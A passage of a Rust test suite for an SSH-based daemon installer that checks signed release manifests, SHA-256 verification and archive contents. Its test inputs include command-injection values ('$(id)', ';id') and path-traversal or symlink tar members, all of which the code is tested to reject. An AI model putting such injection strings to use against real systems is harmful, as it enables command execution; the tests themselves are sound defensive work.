    assert!(installed.restart_needed);
    assert_eq!(
        installed.built_version.as_deref(),
        Some(format!("{version}-other").as_str())
    );
}

// The release channel ---------------------------------------------------

/// The fixed scripts: constant text, single quotes only around them over
/// SSH, no backslashes, and every varying value a validated positional
/// argument.
#[test]
fn the_channel_install_script_is_fixed_and_takes_its_values_as_arguments() {
    for script in [
        install::CHANNEL_INSTALL_SCRIPT,
        install::INSTALL_REF_SCRIPT,
        install::INSTALL_DEFAULT_SCRIPT,
        install::ARCH_COMMAND,
    ] {
        assert!(!script.contains('\''), "{script}");
        assert!(!script.contains('\\'), "{script}");
        assert!(!script.contains('`'), "{script}");
    }
    // The source bootstrap: curl, else wget, the ref still $1.
    for script in [install::INSTALL_REF_SCRIPT, install::INSTALL_DEFAULT_SCRIPT] {
        assert!(script.contains("command -v curl"), "{script}");
        assert!(script.contains("wget -q -O"), "{script}");
    }
    assert!(install::INSTALL_REF_SCRIPT.contains(r#"--ref "$1""#));
    let version = "20261017T120000Z-edf6cca5b358";
    let commit = "edf6cca5b358619d73504c6bb417c7c5742aaeb1";
    let sha256 = "ab".repeat(32);
    assert_eq!(
        install::channel_arguments(version, commit, &sha256).unwrap(),
        [
            "-c",
            install::CHANNEL_INSTALL_SCRIPT,
            "sh",
            version,
            commit,
            sha256.as_str()
        ]
    );
    assert_eq!(
        install::channel_command(version, commit, &sha256).unwrap(),
        format!(
            "sh -c '{}' sh {version} {commit} {sha256}",
            install::CHANNEL_INSTALL_SCRIPT
        )
    );
    for (version, commit, sha256) in [
        ("20261017T120000Z-edf6cca5b35", commit, sha256.as_str()),
        ("20261017T120000Z-edf6cca5b358;id", commit, &sha256),
        ("$(id)", commit, &sha256),
        (version, "EDF6CCA5B358619D73504C6BB417C7C5742AAEB1", &sha256),
        (version, "edf6cca5b358619d73504c6bb417c7c5742aaeb", &sha256),
        (
            version,
            "edf6cca5b358619d73504c6bb417c7c5742aaeb1 x",
            &sha256,
        ),
        (version, commit, &"ab".repeat(31)),
        (version, commit, &format!("{}zz", "ab".repeat(31))),
    ] {
        assert!(
            install::channel_arguments(version, commit, sha256).is_err(),
            "{version} {commit} {sha256}"
        );
        assert!(install::channel_command(version, commit, sha256).is_err());
    }
    // The script installs only what matches the SHA-256 it was given, and
    // names the release and commit only through $1 and $2.
    assert!(install::CHANNEL_INSTALL_SCRIPT.contains(r#"[ "${s%% *}" != "$3" ]"#));
    assert!(install::CHANNEL_INSTALL_SCRIPT.contains(r#"--ref "$1" --commit "$2""#));
    assert!(!install::CHANNEL_INSTALL_SCRIPT.contains(version));
    // The record the channel's install script checks: the release and the
    // binary's SHA-256.
    assert!(
        install::CHANNEL_INSTALL_SCRIPT
            .contains(r#"echo "$1 $3" >"$p/lib/gigahost/ghostd-release""#)
    );
    assert!(install::CHANNEL_INSTALL_SCRIPT.contains(install::ALREADY_INSTALLED));
}

/// A ghostd for the fixed script: it records its calls under
/// `$GHOSTD_FAKE`, and its `status` says a daemon runs while the file
/// `running` is there, answering with the version in `daemon_version`, as
/// ghostd's own status prints it (one line, keys sorted). `build` makes
/// binaries that differ.
fn fake_ghostd(build: u32) -> Vec<u8> {
    format!(
        r#"#!/bin/sh
# build {build}
printf '%s\n' "$*" >>"$GHOSTD_FAKE/calls"
case $1 in
    setup) echo '{{"binary":"ghostd","install":null,"version":"0.1.1"}}' ;;
    status)
        if [ -e "$GHOSTD_FAKE/running" ]; then
            printf '{{"daemon_version":"%s","jobs":{{"finished":0,"running":1}},"pid":42,"running":true,"socket":"/tmp/version","state_dir":"/tmp/daemon_version/x","version":"0.1.1"}}\n' "$(cat "$GHOSTD_FAKE/daemon_version")"
        else
            echo '{{"daemon_version":null,"jobs":{{"finished":0,"running":0}},"pid":null,"running":false,"socket":"/tmp/s","state_dir":"/tmp/t","version":"0.1.1"}}'
        fi ;;
    stop) rm -f "$GHOSTD_FAKE/running" ;;
esac
"#
    )
    .into_bytes()
}

/// Runs the fixed channel script with `sh -c` locally, `home` as `$HOME`,
/// `binary` on its stdin and `sha256` as `$3`: whether it succeeded, and
/// its stderr.
fn run_channel_script(home: &Path, fake: &Path, binary: &[u8], sha256: &str) -> (bool, String) {
    use std::io::Write as _;
    let mut child = std::process::Command::new("sh")
        .args(install::channel_arguments(VERSION, COMMIT, sha256).unwrap())
        .env("HOME", home)
        .env("GHOSTD_FAKE", fake)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    // The script may not read it all (it refuses early): a broken pipe is
    // its answer.
    let _ = child.stdin.take().unwrap().write_all(binary);
    let output = child.wait_with_output().unwrap();
    (
        output.status.success(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    )
}

/// The fixed channel script installs what matches its SHA-256 and stops a
/// daemon that runs the old binary; given the binary that is already in
/// place, it replaces nothing and leaves a daemon that runs it alone (its
/// connections stay), unless that daemon answers with another version.
#[test]
fn the_channel_script_leaves_the_release_that_is_there_and_its_daemon_alone() {
    use sha2::{Digest as _, Sha256};
    let uid = std::process::Command::new("id").arg("-u").output().unwrap();
    if String::from_utf8_lossy(&uid.stdout).trim() == "0" {
        eprintln!("skipping: as root the script installs under /usr/local");
        return;
    }
    let directory = tempfile::tempdir().unwrap();
    let home = directory.path().join("home");
    let fake = directory.path().join("fake");
    std::fs::create_dir_all(&home).unwrap();
    std::fs::create_dir_all(&fake).unwrap();
    let calls = || std::fs::read_to_string(fake.join("calls")).unwrap_or_default();
    let reset = |daemon_version: &str| {
        let _ = std::fs::remove_file(fake.join("calls"));
        std::fs::write(fake.join("running"), "").unwrap();
        std::fs::write(fake.join("daemon_version"), daemon_version).unwrap();
    };
    let installed = home.join(".local/bin/ghostd");
    let record = home.join(".local/lib/gigahost/ghostd-release");
    let first = fake_ghostd(1);
    let first_sha = ops::hex(&Sha256::digest(&first));
    let setup = format!("setup --origin channel --ref {VERSION} --commit {COMMIT}");

    // A first install: in place, set up, recorded, the old daemon stopped.
    reset("0.1.0");
    let (ok, output) = run_channel_script(&home, &fake, &first, &first_sha);
    assert!(ok, "{output}");
    assert_eq!(std::fs::read(&installed).unwrap(), first);
    assert_eq!(calls(), format!("{setup}\nstatus\nstop\n"));
    assert!(
        output.contains("stopped the running ghostd daemon"),
        "{output}"
    );
    assert!(!output.contains(install::ALREADY_INSTALLED), "{output}");
    assert_eq!(
        std::fs::read_to_string(&record).unwrap(),
        format!("{VERSION} {first_sha}\n")
    );

    // The same release again, its daemon running it: nothing replaced,
    // set up again, the daemon kept.
    reset("0.1.1");
    let modified = std::fs::metadata(&installed).unwrap().modified().unwrap();
    let (ok, output) = run_channel_script(&home, &fake, &first, &first_sha);
    assert!(ok, "{output}");
    assert!(output.contains(install::ALREADY_INSTALLED), "{output}");
    assert!(output.contains("keeps running"), "{output}");
    assert_eq!(calls(), format!("{setup}\nstatus\n"));
    assert!(fake.join("running").exists());
    assert_eq!(
        std::fs::metadata(&installed).unwrap().modified().unwrap(),
        modified
    );
    let mut notes = install::InstallNotes::default();
    for line in output.lines() {
        notes.observe(line);
    }
    assert!(notes.unchanged && !notes.daemon_runs, "{output}");

    // The same release, but its daemon answers with another version (an
    // earlier stop failed): stopped.
    reset("0.1.0");
    let (ok, output) = run_channel_script(&home, &fake, &first, &first_sha);
    assert!(ok, "{output}");
    assert!(output.contains(install::ALREADY_INSTALLED), "{output}");
    assert_eq!(calls(), format!("{setup}\nstatus\nstop\n"));

    // Another binary of the same ghostd version: replaced, and the daemon
    // that runs the old one stopped although its version is the same.
    reset("0.1.1");
    let second = fake_ghostd(2);
    let second_sha = ops::hex(&Sha256::digest(&second));
    let (ok, output) = run_channel_script(&home, &fake, &second, &second_sha);
    assert!(ok, "{output}");
    assert_eq!(std::fs::read(&installed).unwrap(), second);
    assert_eq!(calls(), format!("{setup}\nstatus\nstop\n"));
    assert!(!output.contains(install::ALREADY_INSTALLED), "{output}");
    assert_eq!(
        std::fs::read_to_string(&record).unwrap(),
        format!("{VERSION} {second_sha}\n")
    );

    // A binary that does not match its SHA-256 changes nothing.
    reset("0.1.1");
    let (ok, output) = run_channel_script(&home, &fake, &first, &"ab".repeat(32));
    assert!(!ok, "{output}");
    assert!(output.contains("does not match its SHA-256"), "{output}");
    assert_eq!(std::fs::read(&installed).unwrap(), second);
    assert!(!home.join(".local/bin/ghostd.new").exists());
    assert_eq!(calls(), "");

    // No daemon running: nothing stopped.
    let _ = std::fs::remove_file(fake.join("calls"));
    std::fs::remove_file(fake.join("running")).unwrap();
    let (ok, output) = run_channel_script(&home, &fake, &first, &first_sha);
    assert!(ok, "{output}");
    assert_eq!(calls(), format!("{setup}\nstatus\n"));
}

/// A muxed connection the SSH master refused goes on without
/// multiplexing; nothing else does.
#[test]
fn a_session_the_ssh_master_refuses_goes_without_multiplexing() {
    let muxed = Endpoint::Ssh {
        host: "203.0.113.7".to_owned(),
        port: Some(22),
        user: Some("root".to_owned()),
        control_path: Some(PathBuf::from("/run/user/1000/ghost/ssh-%C")),
        host_keys: None,
    };
    let plain = Endpoint::Ssh {
        host: "203.0.113.7".to_owned(),
        port: Some(22),
        user: Some("root".to_owned()),
        control_path: None,
        host_keys: None,
    };
    assert_eq!(muxed.without_mux(), plain);
    for refused in [
        "mux_client_request_session: session request failed: Session open refused by peer",
        "muxclient: master refused session",
        "channel 3: open failed: administratively prohibited: MaxSessions",
    ] {
        assert!(conn::mux_refused(refused), "{refused}");
        assert_eq!(
            conn::without_refused_mux(&muxed, refused),
            Some(plain.clone())
        );
        // Not multiplexed, or another failure: nothing to retry.
        assert_eq!(conn::without_refused_mux(&plain, refused), None);
    }
    assert_eq!(
        conn::without_refused_mux(&muxed, "Permission denied (publickey)."),
        None
    );
    assert_eq!(
        conn::without_refused_mux(&Endpoint::local(), "Session open refused by peer"),
        None
    );
}

/// A request that would not fit in one frame is refused before it is sent,
/// with its size: a script and stdin of 8 MiB each.
#[test]
fn an_exec_too_large_for_one_frame_is_refused_with_its_sizes() {
    let directory = tempfile::tempdir().unwrap();
    let server = GhostServer::new(
        Arc::new(Resolver::offline()),
        directory.path().to_path_buf(),
    );
    let big = vec![b'x'; ops::MAX_INLINE];
    std::fs::write(directory.path().join("script"), &big).unwrap();
    std::fs::write(directory.path().join("stdin"), &big).unwrap();
    let input: mcp::ProgramInput = serde_json::from_value(json!({
        "script_file": "script",
        "stdin_file": "stdin",
    }))
    .unwrap();
    let error = server.spec(&input).unwrap_err().to_string();
    assert!(error.contains("more than the"), "{error}");
    assert!(
        error.contains(&format!(
            "the script takes {} bytes, stdin {}",
            big.len(),
            big.len()
        )),
        "{error}"
    );
    // Each alone fits.
    let input: mcp::ProgramInput =
        serde_json::from_value(json!({"script_file": "script"})).unwrap();
    assert!(server.spec(&input).is_ok());
    let request = Request::FileWrite {
        path: b"f".to_vec(),
        data: vec![0; ghostd_protocol::MAX_FRAME],
        mode: None,
        create_dirs: false,
    };
    assert!(conn::check_size(&ghostd_protocol::v2::Request::V1(request)).is_err());
}

/// The status says when the channel has another ghostd than the one that
/// answers.
#[test]
fn the_status_compares_the_answering_version_with_the_channel() {
    let mut view = StatusView {
        target: "web-1".to_owned(),
        endpoint: "root@203.0.113.7".to_owned(),
        ghostd_version: "0.1.0".to_owned(),
        protocol_version: 1,
        latency_ms: 1.0,
        channel_release: None,
        channel_ghostd_version: None,
        update_available: None,
        update: None,
        channel_error: None,
        host_check: false,
        host_check_note: None,
        host_id: None,
        hostname: None,
        machine_id: None,
        boot_id: None,
        notice: None,
    };
    let mut manifest = channel::Manifest {
        version: "20261017T120000Z-edf6cca5b358".to_owned(),
        commit: "edf6cca5b358619d73504c6bb417c7c5742aaeb1".to_owned(),
        sha256: "ab".repeat(32),
        archive_url: "https://apps.example/x.tar.gz".to_owned(),
        ghostd_version: Some("0.1.1".to_owned()),
    };
    view.compare(&manifest);
    assert_eq!(view.update_available, Some(true));
    assert_eq!(view.update.as_deref(), Some("ghost ghostd install web-1"));
    assert_eq!(
        view.channel_release.as_deref(),
        Some("20261017T120000Z-edf6cca5b358")
    );
    "0.1.1".clone_into(&mut view.ghostd_version);
    view.compare(&manifest);
    assert_eq!(
        (view.update_available, view.update.as_deref()),
        (Some(false), None)
    );
    manifest.ghostd_version = None;
    view.compare(&manifest);
    assert_eq!(view.update_available, None);
}

/// A signing key and its PEM public key, as the release key.
fn release_key(seed: u8) -> (ed25519_dalek::SigningKey, String) {
    use base64::{Engine as _, engine::general_purpose::STANDARD};
    let key = ed25519_dalek::SigningKey::from_bytes(&[seed; 32]);
    let mut der = vec![
        0x30, 0x2a, 0x30, 0x05, 0x06, 0x03, 0x2b, 0x65, 0x70, 0x03, 0x21, 0x00,
    ];
    der.extend_from_slice(key.verifying_key().as_bytes());
    let pem = format!(
        "-----BEGIN PUBLIC KEY-----\n{}\n-----END PUBLIC KEY-----\n",
        STANDARD.encode(der)
    );
    (key, pem)
}

/// A manifest of `release` signed with `key`, as the build script writes
/// it.
fn signed_manifest(key: &ed25519_dalek::SigningKey, release: &Value) -> Vec<u8> {
    use base64::{Engine as _, engine::general_purpose::STANDARD};
    use ed25519_dalek::Signer as _;
    let mut manifest: gigahost_client_api::release::SignedReleaseManifest =
        serde_json::from_value(json!({"release": release, "signature": ""})).unwrap();
    manifest.signature = STANDARD.encode(key.sign(&manifest.signed_bytes()).to_bytes());
    serde_json::to_vec(&manifest).unwrap()
}

/// One tar member: its name, its type flag and its data.
fn tar_member(name: &str, kind: u8, data: &[u8]) -> Vec<u8> {
    let mut header = [0_u8; 512];
    header[..name.len()].copy_from_slice(name.as_bytes());
    header[100..107].copy_from_slice(b"0000755");
    header[108..115].copy_from_slice(b"0001750");
    header[116..123].copy_from_slice(b"0001750");
    header[124..135].copy_from_slice(format!("{:011o}", data.len()).as_bytes());
    header[136..147].copy_from_slice(b"15073614400");
    header[156] = kind;
    header[257..263].copy_from_slice(b"ustar\0");
    header[263..265].copy_from_slice(b"00");
    header[148..156].copy_from_slice(b"        ");
    let sum: u32 = header.iter().map(|byte| u32::from(*byte)).sum();
    header[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
    let mut member = header.to_vec();
    member.extend_from_slice(data);
    member.resize(member.len().div_ceil(512) * 512, 0);
    member
}

fn tar_gz(members: &[Vec<u8>]) -> Vec<u8> {
    use std::io::Write as _;
    let mut tar: Vec<u8> = members.concat();
    tar.extend_from_slice(&[0; 1024]);
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&tar).unwrap();
    encoder.finish().unwrap()
}

const VERSION: &str = "20261017T120000Z-edf6cca5b358";
const COMMIT: &str = "edf6cca5b358619d73504c6bb417c7c5742aaeb1";

/// A release's members, `ghostd` holding `binary`.
fn release_members(binary: &[u8]) -> Vec<Vec<u8>> {
    vec![
        tar_member("VERSION", b'0', format!("{VERSION}\n").as_bytes()),
        tar_member("ghostd", b'0', binary),
        tar_member("LICENSE-MIT", b'0', b"MIT\n"),
        tar_member("LICENSE-APACHE", b'0', b"Apache\n"),
    ]
}

/// The files an HTTP test server answers, by path.
type Files = Arc<std::sync::Mutex<std::collections::HashMap<String, Vec<u8>>>>;

/// An HTTP server on 127.0.0.1 that answers each path (its query left out)
/// from `files`, 404 otherwise; its URL.
async fn serve_files(files: Files) -> String {
    serve_files_logged(files, Requests::default()).await
}

/// What an HTTP test server was asked for: each request's target, its
/// query included.
type Requests = Arc<std::sync::Mutex<Vec<String>>>;

/// [`serve_files`], keeping each request's target in `requests`.
async fn serve_files_logged(files: Files, requests: Requests) -> String {
    use tokio::io::AsyncReadExt as _;
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move {
        while let Ok((mut stream, _)) = listener.accept().await {
            let files = Arc::clone(&files);
            let requests = Arc::clone(&requests);
            tokio::spawn(async move {
                let mut request = Vec::new();
                let mut chunk = [0_u8; 4096];
                while !request.windows(4).any(|window| window == b"\r\n\r\n") {
                    match stream.read(&mut chunk).await {
                        Ok(0) | Err(_) => return,
                        Ok(read) => request.extend_from_slice(&chunk[..read]),
                    }
                }
                let line = String::from_utf8_lossy(&request)
                    .lines()
                    .next()
                    .unwrap_or_default()
                    .to_owned();
                requests
                    .lock()
                    .unwrap()
                    .push(line.split(' ').nth(1).unwrap_or_default().to_owned());
                let path = line
                    .split(' ')
                    .nth(1)
                    .unwrap_or_default()
                    .split('?')
                    .next()
                    .unwrap_or_default()
                    .to_owned();
                let body = files.lock().unwrap().get(&path).cloned();
                let (status, body) = match body {
                    Some(body) => ("200 OK", body),
                    None => ("404 Not Found", b"{}".to_vec()),
                };
                let head = format!(
                    "HTTP/1.1 {status}\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n",
                    body.len()
                );
                let _ = stream.write_all(head.as_bytes()).await;
                let _ = stream.write_all(&body).await;
                let _ = stream.shutdown().await;
            });
        }
    });
    url
}

/// A manifest for the archive `name` (`bytes`) at `base`, signed with
/// `signer`, naming `commit` when given.
fn manifest_for(
    base: &str,
    name: &str,
    bytes: &[u8],
    signer: &ed25519_dalek::SigningKey,
    commit: Option<&str>,
) -> Vec<u8> {
    use sha2::{Digest as _, Sha256};
    let mut release = json!({
        "archive_url": format!("{base}/{name}.tar.gz"),
        "sha256": format!("{:x}", Sha256::digest(bytes)),
        "version": VERSION,
        "ghostd_version": "0.1.1",
    });
    if let Some(commit) = commit {
        release["commit"] = json!(commit);
    }
    signed_manifest(signer, &release)
}

/// The channel as ghost checks it: the release key and the manifest from
/// `/v1/releases`, the signature, the archive's SHA-256 and its members,
/// all before anything reaches a target.
#[tokio::test(flavor = "multi_thread")]
async fn ghost_checks_a_channel_release_before_it_reaches_a_target() {
    use sha2::{Digest as _, Sha256};
    let (key, pem) = release_key(7);
    let (other_key, _) = release_key(8);
    let binary = b"\x7fELF a ghostd".to_vec();
    let good = tar_gz(&release_members(&binary));
    let mut extra = release_members(&binary);
    extra.push(tar_member("evil", b'0', b"x"));
    let mut traversal = release_members(&binary);
    traversal[1] = tar_member("../ghostd", b'0', &binary);
    let mut link = release_members(&binary);
    link[1] = tar_member("ghostd", b'2', b"");
    let mut twice = release_members(&binary);
    twice.push(tar_member("ghostd", b'0', &binary));
    let mut other_version = release_members(&binary);
    other_version[0] = tar_member("VERSION", b'0', b"20261017T120000Z-000000000000\n");
    let mut missing = release_members(&binary);
    missing.remove(2);
    let archives = [
        ("good", good.clone()),
        ("extra", tar_gz(&extra)),
        ("traversal", tar_gz(&traversal)),
        ("link", tar_gz(&link)),
        ("twice", tar_gz(&twice)),
        ("other-version", tar_gz(&other_version)),
        ("missing", tar_gz(&missing)),
        ("oversized", vec![0; channel::MAX_ARCHIVE_BYTES + 1]),
    ];
    let shared = Files::default();
    let base = serve_files(Arc::clone(&shared)).await;
    let mut files = std::collections::HashMap::new();
    for (name, bytes) in &archives {
        files.insert(format!("/{name}.tar.gz"), bytes.clone());
        files.insert(
            format!("/{name}.json"),
            manifest_for(&base, name, bytes, &key, Some(COMMIT)),
        );
    }
    files.insert(
        "/forged.json".to_owned(),
        manifest_for(&base, "good", &good, &other_key, Some(COMMIT)),
    );
    files.insert(
        "/no-commit.json".to_owned(),
        manifest_for(&base, "good", &good, &key, None),
    );
    // The signature covers the SHA-256: a manifest naming another archive's
    // digest is signed, but the archive it names does not match.
    let wrong = json!({
        "archive_url": format!("{base}/good.tar.gz"),
        "sha256": "0".repeat(64),
        "version": VERSION,
        "commit": COMMIT,
    });
    files.insert("/wrong-sha.json".to_owned(), signed_manifest(&key, &wrong));
    // One byte of a signed manifest changed.
    let mut tampered: Value = serde_json::from_slice(&files["/good.json"]).unwrap();
    tampered["release"]["ghostd_version"] = json!("9.9.9");
    files.insert(
        "/tampered.json".to_owned(),
        serde_json::to_vec(&tampered).unwrap(),
    );
    files.insert(
        "/v1/releases".to_owned(),
        serde_json::to_vec(&json!({
            "release_public_key_pem": pem,
            "hypervisor": null,
            "cli": null,
            "ghostd": {"manifest_url": format!("{base}/good.json"), "install_url": format!("{base}/install/ghostd.sh")},
        }))
        .unwrap(),
    );
    shared.lock().unwrap().extend(files);

    // From the API to the binary.
    let source = channel::source(&base, false).await.unwrap();
    assert_eq!(source.manifest_url, format!("{base}/good.json"));
    let release = channel::fetch(&source).await.unwrap();
    assert_eq!(release.binary, binary);
    assert_eq!(release.manifest.commit, COMMIT);
    assert_eq!(release.manifest.ghostd_version.as_deref(), Some("0.1.1"));
    assert_eq!(release.binary_sha256, ops::hex(&Sha256::digest(&binary)));

    let at = |name: &str| channel::ChannelSource {
        manifest_url: format!("{base}/{name}.json"),
        public_key_pem: pem.clone(),
    };
    for (name, words) in [
        ("forged", "signature is invalid"),
        ("tampered", "signature is invalid"),
        ("wrong-sha", "does not match the signed manifest"),
        ("no-commit", "names no commit"),
        ("extra", "unexpected paths"),
        ("traversal", "unexpected paths"),
        ("link", "unexpected paths"),
        ("twice", "more than once"),
        ("other-version", "version differs"),
        ("missing", "unexpected paths"),
        ("oversized", "larger than"),
    ] {
        let error = match channel::fetch(&at(name)).await {
            Ok(_) => panic!("{name} was accepted"),
            Err(error) => format!("{error:#}"),
        };
        assert!(error.contains(words), "{name}: {error}");
    }
    // Under another key, nothing verifies.
    let (_, other_pem) = release_key(9);
    let error = channel::fetch(&channel::ChannelSource {
        manifest_url: format!("{base}/good.json"),
        public_key_pem: other_pem,
    })
    .await
    .err()
    .map(|error| format!("{error:#}"))
    .unwrap_or_default();
    assert!(error.contains("signature is invalid"), "{error}");
    // A backend without the channel names the source install.
    let none: gigahost_client_api::website::ReleaseChannelsView = serde_json::from_value(json!({
        "release_public_key_pem": pem,
        "hypervisor": null,
        "cli": null,
    }))
    .unwrap();
    let error = channel::source_of(&none, &base).unwrap_err().to_string();
    assert!(error.contains("--from-source"), "{error}");
}

/// A TCP server on 127.0.0.1 that accepts connections and never answers;
/// its URL.
async fn serve_nothing() -> String {
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move {
        let mut held = Vec::new();
        while let Ok((stream, _)) = listener.accept().await {
            held.push(stream);
        }
    });
    url
}

/// A status asks the channel for a bounded time: an API or a CDN that
/// accepts the connection and never answers is a `channel_error` within the
/// wait, not a status that hangs. Its manifest read may come from a cache
/// (no query of its own); an install's never does.
#[tokio::test(flavor = "multi_thread")]
async fn a_status_waits_for_the_release_channel_a_bounded_time() {
    let silent = serve_nothing().await;
    let (key, pem) = release_key(7);
    let binary = b"\x7fELF a ghostd".to_vec();
    let good = tar_gz(&release_members(&binary));
    let shared = Files::default();
    let requests = Requests::default();
    let base = serve_files_logged(Arc::clone(&shared), Arc::clone(&requests)).await;
    let channels = |manifest_url: String| {
        serde_json::to_vec(&json!({
            "release_public_key_pem": pem,
            "hypervisor": null,
            "cli": null,
            "ghostd": {"manifest_url": manifest_url, "install_url": format!("{base}/install/ghostd.sh")},
        }))
        .unwrap()
    };
    {
        let mut files = shared.lock().unwrap();
        files.insert("/good.tar.gz".to_owned(), good.clone());
        files.insert(
            "/good.json".to_owned(),
            manifest_for(&base, "good", &good, &key, Some(COMMIT)),
        );
        files.insert(
            "/v1/releases".to_owned(),
            channels(format!("{silent}/manifest.json")),
        );
    }
    let wait = Duration::from_millis(500);
    // The API never answers; then the API answers, but the CDN never does.
    for api_url in [silent.as_str(), base.as_str()] {
        let started = Instant::now();
        let error = tokio::time::timeout(
            Duration::from_secs(10),
            super::channel_release(api_url, wait),
        )
        .await
        .expect("the status waited for the channel unbounded")
        .err()
        .map(|error| format!("{error:#}"))
        .unwrap_or_default();
        assert!(
            error.contains("did not answer within 0.5 s"),
            "{api_url}: {error}"
        );
        assert!(started.elapsed() < Duration::from_secs(3));
    }
    assert_eq!(
        super::CHANNEL_STATUS_WAIT,
        Duration::from_secs(5),
        "a status answers within seconds"
    );
    // A channel that answers: the status reads the manifest as it is
    // named, the install with a query of its own.
    shared.lock().unwrap().insert(
        "/v1/releases".to_owned(),
        channels(format!("{base}/good.json")),
    );
    requests.lock().unwrap().clear();
    let manifest = super::channel_release(&base, wait).await.unwrap();
    assert_eq!(manifest.version, VERSION);
    let source = channel::source(&base, false).await.unwrap();
    channel::fetch(&source).await.unwrap();
    let asked: Vec<String> = requests
        .lock()
        .unwrap()
        .iter()
        .filter(|target| target.starts_with("/good.json"))
        .cloned()
        .collect();
    assert_eq!(asked.len(), 2, "{asked:?}");
    assert_eq!(asked[0], "/good.json");
    assert!(asked[1].starts_with("/good.json?install="), "{asked:?}");
}

/// A channel release installed with the fixed script, run as `sh -c`
/// locally into a home of its own with the real ghostd as the binary on
/// its stdin: in place under `~/.local/bin`, its SHA-256 checked (a wrong
/// one refused, nothing installed), `ghostd setup` run with the release
/// and commit, the running daemon stopped and its job still running.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_channel_install_puts_the_binary_in_place_and_stops_the_old_daemon() {
    use sha2::{Digest as _, Sha256};
    let daemon = Daemon::start();
    let home = daemon.path("home");
    std::fs::create_dir_all(&home).unwrap();
    let mut env = daemon.env();
    env.push(("HOME".into(), home.clone().into_os_string()));
    let endpoint = Endpoint::Local {
        program: daemon.program.clone(),
        env,
    };
    let pool = Pool::for_endpoint("local", endpoint.clone());
    // A daemon that runs, and a job of it.
    let job = ops::job_start(
        &pool,
        ExecSpec {
            program: argv(&["sleep", "30"]),
            ..ExecSpec::default()
        },
    )
    .await
    .unwrap();
    let binary = std::fs::read(&daemon.program).unwrap();
    let manifest = channel::Manifest {
        version: VERSION.to_owned(),
        commit: COMMIT.to_owned(),
        sha256: "ab".repeat(32),
        archive_url: "https://apps.example/ghostd.tar.gz".to_owned(),
        ghostd_version: None,
    };
    // A binary that does not match its SHA-256 is refused.
    let wrong = channel::Release {
        manifest: manifest.clone(),
        binary: b"not ghostd".to_vec(),
        binary_sha256: ops::hex(&Sha256::digest(&binary)),
    };
    let mut lines = Vec::new();
    let error = install::install_release(
        &pool,
        &wrong,
        &mut |line: &str| lines.push(line.to_owned()),
        Instant::now(),
    )
    .await
    .err()
    .map(|error| format!("{error:#}"))
    .unwrap_or_default();
    assert!(error.contains("does not match its SHA-256"), "{error}");
    assert!(!home.join(".local/bin/ghostd").exists());
    assert!(!home.join(".local/bin/ghostd.new").exists());

    let release = channel::Release {
        manifest,
        binary_sha256: ops::hex(&Sha256::digest(&binary)),
        binary: binary.clone(),
    };
    let mut lines = Vec::new();
    let installed = install::install_release(
        &pool,
        &release,
        &mut |line: &str| lines.push(line.to_owned()),
        Instant::now(),
    )
    .await
    .unwrap();
    let output = lines.join("\n");
    assert_eq!(
        std::fs::read(home.join(".local/bin/ghostd")).unwrap(),
        binary
    );
    assert!(
        output.contains("stopped the running ghostd daemon"),
        "{output}"
    );
    assert!(
        output.contains(r#""origin":"channel""#)
            && output.contains(VERSION)
            && output.contains(COMMIT),
        "{output}"
    );
    assert_eq!(installed.origin, "channel");
    assert_eq!(installed.release.as_deref(), Some(VERSION));
    assert!(!installed.restart_needed, "{installed:?}");
    // The job outlived the daemon's stop.
    let info = ops::job_info(
        ops::Via::Short(&pool),
        Request::JobStatus {
            job_id: job.clone(),
        },
    )
    .await
    .unwrap();
    assert!(!info.finished, "{info:?}");

    // The same release again: nothing replaced, and the daemon the check's
    // connection started keeps running, with another client's connection.
    let other = Pool::for_endpoint("local", endpoint);
    let pid = other.short().await.unwrap().pid();
    let mut lines = Vec::new();
    let again = install::install_release(
        &pool,
        &release,
        &mut |line: &str| lines.push(line.to_owned()),
        Instant::now(),
    )
    .await
    .unwrap();
    let output = lines.join("\n");
    assert!(again.unchanged, "{output}");
    assert!(output.contains("keeps running"), "{output}");
    assert!(!output.contains("stopped the running"), "{output}");
    assert!(!again.restart_needed, "{again:?}");
    other.call(Request::Ping).await.unwrap();
    assert_eq!(
        other.short().await.unwrap().pid(),
        pid,
        "the other client's connection stayed"
    );
    pool.call(Request::JobStop {
        job_id: job,
        grace_ms: Some(0),
    })
    .await
    .unwrap();
}

/// A request over one frame is refused before it is sent: the connection
/// stays and is not tried again.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_a_request_too_large_keeps_the_connection() {
    let daemon = Daemon::start();
    let pool = daemon.pool();
    let pid = pool.short().await.unwrap().pid();
    let error = pool
        .call(Request::FileWrite {
            path: ops::bytes(daemon.path("big").to_str().unwrap()),
            data: vec![0; ghostd_protocol::MAX_FRAME + 1],
            mode: None,
            create_dirs: false,
        })
        .await
        .unwrap_err()
        .to_string();
    assert!(error.contains("more than the"), "{error}");
    assert!(!error.contains("lost"), "{error}");
    assert_eq!(pool.short().await.unwrap().pid(), pid);
    pool.call(Request::Ping).await.unwrap();
    assert!(!daemon.path("big").exists());
}

/// A bulk connection that drops under a read is replaced, and the read
/// sent again; a change is not.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs GHOSTD_BIN"]
async fn ghostd_a_bulk_read_is_sent_again_on_a_new_connection() {
    let daemon = Daemon::start();
    let pool = daemon.pool();
    let bulk = pool.bulk().await.unwrap();
    let pid = bulk.link().pid().unwrap();
    kill(pid);
    tokio::time::sleep(Duration::from_millis(300)).await;
    bulk.call(Request::Ping).await.unwrap();
    let replaced = bulk.link().pid().unwrap();
    assert_ne!(replaced, pid);
    kill(replaced);
    tokio::time::sleep(Duration::from_millis(300)).await;
    let error = bulk
        .call(Request::FileMkdir {
            path: ops::bytes(daemon.path("d").to_str().unwrap()),
            parents: false,
            mode: None,
        })
        .await
        .unwrap_err()
        .to_string();
